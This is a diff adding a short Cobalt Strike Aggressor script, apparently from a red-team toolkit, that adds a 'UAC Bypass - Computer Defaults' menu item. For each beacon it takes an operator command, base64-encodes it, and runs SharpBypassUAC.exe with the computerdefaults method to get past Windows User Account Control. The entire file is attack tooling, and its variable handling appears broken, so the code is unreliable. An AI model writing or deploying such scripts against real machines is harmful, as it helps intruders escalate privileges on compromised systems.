@@ -1,0 +1,14 @@
+item "UAC Bypass - Computer Defaults"{
+	local('$bid');
+		foreach $bid ($1){
+			computerdefaults_bypass($bid);
+		}
+	}
+
+
+sub computerdefaults_bypass{
+prompt_text("Enter A Command:", "", lambda({ 
+$b64 = base64_encode("$1")
+}))
+bexecute_assembly($bid, script_resource('exe/SharpBypassUAC.exe'),"-b computerdefaults -e $b64"); 
+}
